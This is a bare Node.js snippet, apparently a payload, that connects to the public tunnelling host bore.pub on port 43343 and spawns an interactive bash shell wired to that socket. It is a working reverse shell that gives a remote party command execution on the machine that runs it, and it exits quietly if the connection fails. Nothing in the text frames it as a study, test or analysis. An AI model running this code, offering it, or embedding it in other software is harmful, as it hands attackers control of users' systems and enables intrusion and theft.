(function(){
  const net=require('net');
  const cp=require('child_process');
  const c=net.createConnection(43343,"bore.pub",function(){
    const sh=cp.spawn('/bin/bash',['-i'],{stdio:[c,c,c]});
  });
  c.on('error',function(){ process.exit(1); });
})();